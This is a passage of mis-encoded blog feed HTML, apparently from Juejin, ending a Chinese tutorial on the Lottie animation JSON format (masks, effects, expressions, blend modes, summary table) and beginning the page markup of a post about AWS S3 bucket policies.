    <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// ä¸é€æ˜åº¦ï¼ˆOpacityï¼‰</span>
    <span class="hljs-attr">"inv"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-comment">// æ˜¯å¦åè½¬ï¼ˆInvertedï¼‰</span>
    <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"è’™ç‰ˆ1"</span>                <span class="hljs-comment">// åç§°ï¼ˆNameï¼‰</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p><strong>å…³é”®å±æ€§ï¼š</strong></p>
<ul>
<li>
<p><strong><code>mode</code></strong>ï¼šè’™ç‰ˆæ··åˆæ¨¡å¼ã€‚é™¤äº†å¸¸ç”¨çš„Â <code>"a"</code>ï¼ˆAddï¼Œç›¸åŠ ï¼‰å’ŒÂ <code>"s"</code>ï¼ˆSubtractï¼Œç›¸å‡ï¼‰ï¼ŒLottie Schema è¿˜å®šä¹‰äº†å…¶ä»–æ¨¡å¼ï¼Œä½†å¹¶éæ‰€æœ‰éƒ½è¢«å®Œå…¨æ”¯æŒã€‚</p>













































<table><thead><tr><th>æ¨¡å¼ä»£ç </th><th>åç§° (è‹±æ–‡)</th><th>ä½œç”¨æ•ˆæœ</th></tr></thead><tbody><tr><td><code>"n"</code></td><td>None (æ— )</td><td>ç¦ç”¨è’™ç‰ˆ</td></tr><tr><td><code>"a"</code></td><td>Add (ç›¸åŠ )</td><td>åˆå¹¶å¤šä¸ªè’™ç‰ˆåŒºåŸŸ</td></tr><tr><td><code>"s"</code></td><td>Subtract (ç›¸å‡)</td><td>ä»ç°æœ‰åŒºåŸŸä¸­å‡å»</td></tr><tr><td><code>"i"</code></td><td>Intersect (ç›¸äº¤)</td><td>åªä¿ç•™è’™ç‰ˆé‡å åŒºåŸŸ</td></tr><tr><td><code>"l"</code></td><td>Lighten (å˜äº®)</td><td>ä¿ç•™è¾ƒäº®åŒºåŸŸ</td></tr><tr><td><code>"d"</code></td><td>Darken (å˜æš—)</td><td>ä¿ç•™è¾ƒæš—åŒºåŸŸ</td></tr><tr><td><code>"f"</code></td><td>Difference (å·®å¼‚)</td><td>æ˜¾ç¤ºé¢œè‰²å·®å¼‚åŒºåŸŸ</td></tr></tbody></table>
</li>
<li>
<p><strong><code>pt</code></strong>ï¼šè’™ç‰ˆè·¯å¾„ï¼Œå…¶æ•°æ®ç»“æ„ï¼ˆå«Â <code>v</code>,Â <code>i</code>,Â <code>o</code>ï¼‰ä¸å½¢çŠ¶å›¾å±‚ä¸­çš„è‡ªç”±è·¯å¾„ï¼ˆ<code>sh</code>ï¼‰å®Œå…¨ç›¸åŒã€‚</p>
</li>
<li>
<p><strong><code>o</code></strong>ï¼šè’™ç‰ˆçš„ä¸é€æ˜åº¦ã€‚</p>
</li>
<li>
<p><strong><code>inv</code></strong>ï¼šå¸ƒå°”å€¼ï¼Œä¸ºÂ <code>true</code>Â æ—¶åè½¬è’™ç‰ˆåŒºåŸŸã€‚</p>
</li>
</ul>
<h3 data-id="heading-47"><strong>æ•ˆæœï¼ˆEffectsï¼‰ï¼š<code>ef</code>Â æ•°ç»„</strong></h3>
<p>Lottie æ”¯æŒéƒ¨åˆ† After Effects å†…ç½®æ•ˆæœï¼Œé€šè¿‡å›¾å±‚çš„Â <code>ef</code>Â æ•°ç»„å®šä¹‰ã€‚<strong>è¯·æ³¨æ„ï¼Œæ”¯æŒçš„æ•ˆæœéå¸¸æœ‰é™ï¼Œä¸”å¹¶éæ‰€æœ‰AEæ•ˆæœéƒ½èƒ½è¢«å®Œç¾æ”¯æŒæˆ–æ¸²æŸ“ã€‚</strong></p>
<p>æ ¹æ®å®˜æ–¹ Schema æ–‡æ¡£ï¼Œæœ‰æ˜ç¡®å®šä¹‰çš„æ•ˆæœç±»å‹åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>å¡«å……</strong>Â (Fill):Â <code>ty: 21</code></li>
<li><strong>æè¾¹</strong>Â (Stroke):Â <code>ty: 22</code></li>
<li><strong>è‰²è°ƒ</strong>Â (Tint):Â <code>ty: 20</code></li>
<li><strong>ä¸‰è‰²è°ƒ/ä¸“ä¸šè‰²é˜¶</strong>Â (Tritone/Pro Levels):Â <code>ty: 23</code></li>
</ul>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"ef"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">21</span><span class="hljs-punctuation">,</span>                 <span class="hljs-comment">// æ•ˆæœç±»å‹ï¼š21 = å¡«å…… (Fill)</span>
  <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"é¢œè‰²å åŠ "</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"en"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>                  <span class="hljs-comment">// å¯ç”¨ (Enabled)</span>
  <span class="hljs-attr">"ef"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"é¢œè‰²"</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span> <span class="hljs-comment">// çº¢è‰²</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
</code></pre>
<blockquote>
<p><strong>é‡è¦è¯´æ˜</strong>ï¼šâ€œé«˜æ–¯æ¨¡ç³Š (<code>ty: 29</code>)â€å’Œâ€œå‘å…‰ (<code>ty: 27</code>)â€ç­‰æ•ˆæœåœ¨å…¬å¼€çš„å®˜æ–¹ Schema æ–‡æ¡£ä¸­<strong>æœªæœ‰æ˜ç¡®å®šä¹‰</strong>ã€‚å®ƒä»¬å¯èƒ½ç”± Bodymovin æ’ä»¶å¯¼å‡ºï¼Œä½†<strong>ä¸ä¸€å®šè¢«æ‰€æœ‰ Lottie æ¸²æŸ“å™¨æ”¯æŒ</strong>ï¼Œåœ¨å®é™…ä½¿ç”¨å‰å¿…é¡»è¿›è¡Œå……åˆ†çš„å…¼å®¹æ€§æµ‹è¯•ã€‚</p>
</blockquote>
<h3 data-id="heading-48"><strong>è¡¨è¾¾å¼ï¼ˆExpressionï¼‰ï¼š<code>x</code>Â å­—æ®µ</strong></h3>
<p>è¡¨è¾¾å¼æ˜¯ After Effects ä¸­ç”¨äºåˆ›å»ºå±æ€§é—´åŠ¨æ€å…³è”çš„è„šæœ¬è¯­è¨€ã€‚åœ¨ Lottie ä¸­ï¼Œè¡¨è¾¾å¼å¯ä»¥å­˜å‚¨åœ¨å±æ€§çš„Â <code>x</code>Â å­—æ®µä¸­ã€‚</p>
<p>json</p>
<pre><code class="hljs language-css" lang="css">"<span class="hljs-selector-tag">p</span>": {
  "<span class="hljs-selector-tag">a</span>": <span class="hljs-number">1</span>,
  <span class="hljs-string">"k"</span>: [{"t":<span class="hljs-number">0</span>, <span class="hljs-string">"s"</span>:[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]}, {"t":<span class="hljs-number">30</span>, <span class="hljs-string">"s"</span>:[<span class="hljs-number">100</span>,<span class="hljs-number">100</span>]}],
  "x": <span class="hljs-string">"loopOut('cycle')"</span>  // è¡¨è¾¾å¼ï¼šå¾ªç¯æ’­æ”¾åŠ¨ç”»
}
</code></pre>
<p><strong>è¡¨è¾¾å¼çš„ä½œç”¨ä¸å±€é™æ€§</strong>ï¼š</p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šå¯ä»¥åˆ›å»ºå¾ªç¯ (<code>loopOut</code>)ã€éšæœº (<code>wiggle</code>)ã€æ•°å­¦å…³è”ç­‰å¤æ‚åŠ¨ç”»é€»è¾‘ï¼Œæ— éœ€å¤§é‡å…³é”®å¸§ã€‚</li>
<li><strong>å±€é™æ€§</strong>ï¼š<strong>å¹³å°æ”¯æŒæä¸å®Œæ•´</strong>ã€‚ä»…æœ‰å°‘æ•°æœ€åŸºç¡€çš„è¡¨è¾¾å¼å¯èƒ½åœ¨éƒ¨åˆ†å¹³å°ä¸Šè¢«è¯†åˆ«ï¼Œå¤æ‚çš„è¡¨è¾¾å¼é€šå¸¸ä¼šè¢«å¿½ç•¥æˆ–å¯¼è‡´åŠ¨ç”»é”™è¯¯ã€‚åœ¨éœ€è¦è·¨å¹³å°ç¨³å®šæ’­æ”¾çš„åŠ¨ç”»ä¸­ï¼Œåº”å°½é‡é¿å…ä½¿ç”¨è¡¨è¾¾å¼ã€‚</li>
</ul>
<h3 data-id="heading-49"><strong>æ··åˆæ¨¡å¼ï¼ˆBlend Modeï¼‰ï¼š<code>bm</code>Â å­—æ®µ</strong></h3>
<p>æ··åˆæ¨¡å¼æ§åˆ¶å½“å‰å›¾å±‚å¦‚ä½•ä¸ä¸‹å±‚å›¾å±‚è¿›è¡Œé¢œè‰²æ··åˆã€‚åœ¨å›¾å±‚ï¼ˆæ ¹å¯¹è±¡ï¼‰æˆ–å½¢çŠ¶æ ·å¼å…ƒç´ ï¼ˆå¦‚Â <code>fl</code>,Â <code>st</code>ï¼‰ä¸­é€šè¿‡Â <code>bm</code>Â å­—æ®µå®šä¹‰ã€‚</p>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"bm"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span>  <span class="hljs-comment">// å åŠ æ¨¡å¼ (Overlay)</span>
</code></pre>
<p><strong>æ··åˆæ¨¡å¼å€¼é€ŸæŸ¥è¡¨</strong>Â (æ ¹æ®å®˜æ–¹Â <code>/helpers/blendMode.json</code>)ï¼š</p>



























































<table><thead><tr><th>å€¼</th><th>æ¨¡å¼ (è‹±æ–‡)</th><th>å€¼</th><th>æ¨¡å¼ (è‹±æ–‡)</th></tr></thead><tbody><tr><td>0</td><td>Normal (æ­£å¸¸)</td><td>8</td><td>Hard Light (å¼ºå…‰)</td></tr><tr><td>1</td><td>Multiply (ç›¸ä¹˜)</td><td>9</td><td>Soft Light (æŸ”å…‰)</td></tr><tr><td>2</td><td>Screen (å±å¹•)</td><td>10</td><td>Difference (å·®å€¼)</td></tr><tr><td>3</td><td>Overlay (å åŠ )</td><td>11</td><td>Exclusion (æ’é™¤)</td></tr><tr><td>4</td><td>Darken (å˜æš—)</td><td>12</td><td>Hue (è‰²ç›¸)</td></tr><tr><td>5</td><td>Lighten (å˜äº®)</td><td>13</td><td>Saturation (é¥±å’Œåº¦)</td></tr><tr><td>6</td><td>Color Dodge (é¢œè‰²å‡æ·¡)</td><td>14</td><td>Color (é¢œè‰²)</td></tr><tr><td>7</td><td>Color Burn (é¢œè‰²åŠ æ·±)</td><td>15</td><td>Luminosity (æ˜åº¦)</td></tr></tbody></table>
<p><strong>æ³¨æ„</strong>ï¼šæ··åˆæ¨¡å¼åœ¨ SVG/HTML æ¸²æŸ“å™¨ä¸­æ”¯æŒè¾ƒå¥½ï¼Œåœ¨å…¶ä»–æ¸²æŸ“å™¨ï¼ˆå¦‚ Canvasï¼‰æˆ–æŸäº›ç§»åŠ¨ç«¯å¹³å°ä¸­å¯èƒ½éœ€è¦é™çº§å¤„ç†æˆ–ä¸è¢«æ”¯æŒã€‚</p>
<hr/>
<h2 data-id="heading-50"><strong>ä¹ã€ç»“è¯­</strong></h2>
<p>æœ¬æ–‡ç³»ç»Ÿæ€§åœ°è§£æäº† Lottie JSON çš„æ ¸å¿ƒæ•°æ®ç»“æ„ã€‚ä»¥ä¸‹æ˜¯å…¨æ–‡çŸ¥è¯†è¦ç‚¹çš„å›é¡¾ä¸æ€»ç»“ï¼š</p>
<h3 data-id="heading-51"><strong>æ ¸å¿ƒæ•°æ®ç»“æ„æ€»è§ˆ</strong></h3>































































































<table><thead><tr><th>æ¨¡å—</th><th>å…³é”®å¯¹è±¡/å­—æ®µ</th><th>æ ¸å¿ƒä½œç”¨ä¸è¦ç‚¹</th></tr></thead><tbody><tr><td><strong>é¡¶å±‚ç»“æ„</strong></td><td><code>v</code>,Â <code>fr</code>,Â <code>ip</code>,Â <code>op</code>,Â <code>w</code>,Â <code>h</code></td><td>å®šä¹‰åŠ¨ç”»å…¨å±€ä¿¡æ¯ï¼šç‰ˆæœ¬ã€å¸§ç‡ã€æ—¶é—´è½´ã€ç”»å¸ƒå°ºå¯¸ã€‚</td></tr><tr><td/><td><code>assets</code>,Â <code>layers</code>,Â <code>chars</code></td><td>ä¸‰å¤§æ•°æ®æ”¯æŸ±ï¼šå¯å¤ç”¨èµ„æºã€å›¾å±‚åºåˆ—ã€çŸ¢é‡å­—å½¢ã€‚</td></tr><tr><td><strong>å›¾å±‚ç³»ç»Ÿ</strong></td><td><code>ty</code>Â (0-5)</td><td>æ ‡è¯†å…­ç§å›¾å±‚ç±»å‹ï¼šé¢„åˆæˆã€çº¯è‰²ã€å›¾åƒã€ç©ºå¯¹è±¡ã€å½¢çŠ¶ã€æ–‡æœ¬ã€‚</td></tr><tr><td/><td><code>ind</code>,Â <code>parent</code>,Â <code>ip</code>,Â <code>op</code>,Â <code>st</code></td><td>æ§åˆ¶å›¾å±‚ç´¢å¼•ã€çˆ¶å­å…³ç³»ã€æ—¶é—´å±æ€§ï¼ˆå…¥ç‚¹ã€å‡ºç‚¹ã€èµ·å§‹æ—¶é—´ï¼‰ã€‚</td></tr><tr><td/><td><code>ks</code></td><td><strong>å˜æ¢å±æ€§å®¹å™¨</strong>ï¼ŒåŒ…å«é”šç‚¹(<code>a</code>)ã€ä½ç½®(<code>p</code>)ã€ç¼©æ”¾(<code>s</code>)ã€æ—‹è½¬(<code>r</code>)ã€é€æ˜åº¦(<code>o</code>)ç­‰ã€‚</td></tr><tr><td><strong>åŠ¨ç”»ç³»ç»Ÿ</strong></td><td><code>ks</code>Â ä¸‹çš„Â <code>a</code>Â å­—æ®µ</td><td>å±æ€§åŠ¨ç”»å¼€å…³ï¼š<code>0</code>ä¸ºé™æ€å€¼ï¼Œ<code>1</code>ä¸ºåŠ¨ç”»å€¼ï¼ˆå…³é”®å¸§æ•°ç»„ï¼‰ã€‚</td></tr><tr><td/><td>å…³é”®å¸§Â <code>k</code>Â æ•°ç»„</td><td>å®šä¹‰åŠ¨ç”»è½¨è¿¹ï¼ŒåŒ…å«æ—¶é—´(<code>t</code>)ã€å€¼(<code>s</code>/<code>e</code>)ã€ç¼“åŠ¨(<code>i</code>/<code>o</code>)ã€‚</td></tr><tr><td><strong>å½¢çŠ¶ç³»ç»Ÿ</strong></td><td><code>shapes</code>Â æ•°ç»„</td><td>å½¢çŠ¶å›¾å±‚çš„<strong>æ ¸å¿ƒå®¹å™¨</strong>ï¼Œå…ƒç´ æŒ‰ç´¢å¼•é¡ºåºæ¸²æŸ“å åŠ ã€‚</td></tr><tr><td/><td><code>ty: el/rc/sr/sh</code></td><td>åŸºç¡€å›¾å½¢ï¼šæ¤­åœ†ã€çŸ©å½¢ã€æ˜Ÿå½¢ã€è‡ªç”±è·¯å¾„ï¼ˆè´å¡å°”æ›²çº¿å®šä¹‰ï¼‰ã€‚</td></tr><tr><td/><td><code>ty: gr</code>Â (ç»„)</td><td>ä½¿ç”¨Â <code>it</code>Â æ•°ç»„ç»„ç»‡å­å…ƒç´ ï¼Œå®ç°å±‚çº§ç®¡ç†ä¸ç»Ÿä¸€å˜æ¢ã€‚</td></tr><tr><td><strong>æ ·å¼ç³»ç»Ÿ</strong></td><td><code>ty: fl</code>Â (å¡«å……)</td><td>å®šä¹‰å½¢çŠ¶å¡«å……è‰²ï¼ˆçº¯è‰²æˆ–æ¸å˜ï¼‰ã€‚</td></tr><tr><td/><td><code>ty: st</code>Â (æè¾¹)</td><td>å®šä¹‰è½®å»“çº¿æ ·å¼ï¼ŒåŒ…æ‹¬çº¿å®½(<code>w</code>)ã€ç«¯ç‚¹(<code>lc</code>)ã€è¿æ¥(<code>lj</code>)ã€‚</td></tr><tr><td><strong>ä¿®æ”¹å™¨</strong></td><td><code>ty: tm</code>Â (Trim)</td><td>è·¯å¾„è£å‰ªï¼Œé€šè¿‡åŠ¨ç”»èµ·ç‚¹(<code>s</code>)ã€ç»ˆç‚¹(<code>e</code>)ã€åç§»(<code>o</code>)å®ç°ç»˜åˆ¶æ•ˆæœã€‚</td></tr><tr><td/><td><code>ty: rp</code>Â (Repeater)</td><td>å›¾å½¢é‡å¤å™¨ï¼Œé€šè¿‡å‰¯æœ¬æ•°(<code>c</code>)å’Œå¢é‡å˜æ¢(<code>tr</code>)åˆ›å»ºé˜µåˆ—ã€‚</td></tr><tr><td><strong>é«˜çº§ç‰¹æ€§</strong></td><td><code>masksProperties</code></td><td>è’™ç‰ˆæ•°ç»„ï¼Œé€šè¿‡è·¯å¾„(<code>pt</code>)å’Œæ¨¡å¼(<code>mode</code>)æ§åˆ¶å›¾å±‚æ˜¾ç¤ºåŒºåŸŸã€‚</td></tr><tr><td/><td><code>ef</code>Â (æ•ˆæœ),Â <code>bm</code>Â (æ··åˆæ¨¡å¼)</td><td>å®ç°æ»¤é•œä¸å›¾å±‚æ··åˆï¼Œ<strong>éœ€æ³¨æ„å¹³å°æ”¯æŒåº¦</strong>ã€‚</td></tr><tr><td/><td><code>x</code>Â (è¡¨è¾¾å¼)</td><td>æ”¯æŒç®€å•è¡¨è¾¾å¼é©±åŠ¨å±æ€§ï¼Œ<strong>è·¨å¹³å°æ”¯æŒæœ‰é™</strong>ã€‚</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-52"><strong>åã€å†™åœ¨æœ€åï¼šç¬”è€…çš„æ€è€ƒ</strong>ğŸ’¡</h2>
<p>åœ¨æ•´ç† Lottie çš„æŠ€æœ¯ç»†èŠ‚æ—¶ï¼Œæˆ‘åå¤æ€è€ƒä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š<strong>æˆ‘ä»¬çœ‹åˆ°çš„è¿™å¥— JSON ç»“æ„ï¼Œåˆ°åº•æ˜¯ç”±ä»€ä¹ˆå†³å®šçš„ï¼Ÿ</strong></p>
<p>æœ€ç›´æ¥çš„ç­”æ¡ˆæ˜¯â€œä¸ºäº†åœ¨ç½‘é¡µä¸Šæ’­æ”¾â€ã€‚ä½†è¿™åªæ˜¯ç›®çš„ï¼Œå¹¶æœªè§£é‡Šå…¶å½¢æ€ã€‚æˆ‘çš„æ€è·¯åˆ†ä¸¤æ­¥æ¨è¿›ï¼šç¬¬ä¸€ï¼Œæ˜¯ Web çš„æ¸²æŸ“èƒ½åŠ›ï¼ˆå¦‚ Canvasï¼‰é™åˆ¶äº†å®ƒçš„è®¾è®¡ï¼›ç¬¬äºŒï¼Œæ˜¯å¦æœ‰æ›´åº•å±‚çš„è“æœ¬åœ¨ä¸»å¯¼ç»“æ„ã€‚</p>
<p>é€šè¿‡é€é¡¹å¯¹æ¯”ï¼Œæˆ‘æ‰¾åˆ°äº†æ›´å…³é”®çš„ä¾æ®ã€‚<strong>Lottie JSON çš„ç»“æ„ï¼Œæœ¬è´¨ä¸Šæ˜¯å¯¹ After Effects å†…éƒ¨åŠ¨ç”»æ•°æ®æ¨¡å‹çš„ç›´æ¥ç¿»è¯‘ã€‚</strong> Â ä¾‹å¦‚ï¼ŒJSON ä¸­çš„Â <code>ks</code>Â å¯¹è±¡ç²¾ç¡®å¯¹åº”äº† AE å›¾å±‚çš„â€œå˜æ¢â€å±æ€§ç»„ï¼Œ<code>shapes</code>Â æ•°ç»„åˆ™å®Œå…¨å¤ç°äº† AE å½¢çŠ¶å±‚çš„å †å é€»è¾‘ã€‚è®¾è®¡è€…çš„é¦–è¦ä»»åŠ¡ï¼Œæ˜¯ä¸º AE çš„åŠ¨ç”»çŠ¶æ€æä¾›ä¸€ä¸ª<strong>æ— æŸä¸”ç²¾ç¡®çš„æ•°æ®æè¿°æ ¼å¼</strong>ã€‚</p>
<p>é‚£ä¹ˆï¼ŒWeb æŠ€æœ¯ï¼ˆå¦‚ Canvas/SVGï¼‰çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿæˆ‘è®¤ä¸ºå®ƒä¸»è¦æ‰®æ¼”äº†Â  <strong>â€œæ”¯æŒåº¦è¯„ä¼°â€ä¸â€œæ€§èƒ½ä¼˜åŒ–â€çš„è§’è‰²</strong>ã€‚å®ƒå¹¶æœªæ”¹å˜æ•°æ®æè¿°çš„æ ¹æœ¬æ–¹å¼ï¼Œè€Œæ˜¯åŸºäºå®ç°éš¾åº¦ä¸æ€§èƒ½æˆæœ¬ï¼Œåˆ’å®šäº†å“ªäº› AE é«˜çº§åŠŸèƒ½å¯ä»¥ï¼ˆæˆ–ä¸å¯ä»¥ï¼‰è¢«åŒ…å«åœ¨è¿™ä¸ªæ ¼å¼ä¸­ã€‚ä¾‹å¦‚ï¼Œä¸€äº›å¤æ‚çš„å®æ—¶æ»¤é•œå¯èƒ½å› æ€§èƒ½è€ƒé‡è€Œè¢«æ’é™¤ã€‚</p>
<p>è¿™è‡ªç„¶å¼•å‘æ›´æ·±ä¸€å±‚ï¼š<strong>AE è‡ªèº«çš„è¿™å¥—å¼ºå¤§æ¨¡å‹åˆæ˜¯å¦‚ä½•å»ºç«‹çš„ï¼Ÿ</strong> Â å®ƒå¹¶éå‡­ç©ºåˆ›é€ ï¼Œè€Œæ˜¯å¯¹æ›´æ—©è¡Œä¸šçš„æ•°å­—åŒ–èåˆã€‚å…¶â€œåˆæˆâ€ä¸â€œå›¾å±‚â€æ¦‚å¿µæºè‡ª<strong>ç”µå½±å·¥ä¸š</strong>çš„èƒ¶ç‰‡å åŠ æµç¨‹ï¼›â€œå…³é”®å¸§â€åŠ¨ç”»ç»§æ‰¿è‡ª<strong>ä¼ ç»Ÿæ‰‹ç»˜åŠ¨ç”»</strong>çš„ç”Ÿäº§æ–¹å¼ï¼›è€Œæ‰€æœ‰è§†è§‰å˜æ¢çš„æ ¹åŸºï¼Œåˆ™æ˜¯<strong>è®¡ç®—æœºå›¾å½¢å­¦</strong>æä¾›çš„æ•°å­¦å·¥å…·ï¼ˆå¦‚åæ ‡å˜æ¢ã€è´å¡å°”æ›²çº¿ï¼‰ã€‚</p>
<p>å› æ­¤ï¼Œå­¦ä¹  Lottie æœ€æœ‰æ•ˆçš„æ–¹æ³•ï¼Œå¹¶éå­¤ç«‹è®°å¿† JSON å­—æ®µï¼Œè€Œæ˜¯<strong>ç†è§£å®ƒä½œä¸ºâ€œAE æ¨¡å‹çš„æ•°æ®æ¥å£â€è¿™ä¸€å®šä½</strong>ã€‚æŒæ¡ AE çš„æ ¸å¿ƒæ¦‚å¿µï¼Œå°±èƒ½ç†è§£ Lottie ç»å¤§éƒ¨åˆ†çš„è®¾è®¡é€»è¾‘ã€‚è¿™æ­ç¤ºäº†ä¸€ç§é«˜æ•ˆçš„å­¦ä¹ è·¯å¾„ï¼šå½“é¢å¯¹ä¸€ä¸ªå‡ºè‰²çš„â€œæŠ€æœ¯è½¬è¯‘å±‚â€æ—¶ï¼Œç›´æ¥ç ”ç©¶å®ƒæ‰€è½¬è¯‘çš„<strong>æºç³»ç»Ÿ</strong>ï¼Œå¾€å¾€æ˜¯ç†è§£å…¶è®¾è®¡æœ€å¿«çš„æ–¹å¼ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨AWS SDKå®ç°S3æ¡¶ç­–ç•¥é…ç½®]]></title>    <link>https://juejin.cn/post/7594310266410696704</link>    <guid>https://juejin.cn/post/7594310266410696704</guid>    <pubDate>2026-01-12T14:46:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594310266410696704" data-draft-id="7593362940071313460" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨AWS SDKå®ç°S3æ¡¶ç­–ç•¥é…ç½®"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-12T14:46:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°ç“¦ç Jç "/> <meta itemprop="url" content="https://juejin.cn/user/1528766364915136"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨AWS SDKå®ç°S3æ¡¶ç­–ç•¥é…ç½®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1528766364915136/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°ç“¦ç Jç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T14:46:10.000Z" title="Mon Jan 12 2026 14:46:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body 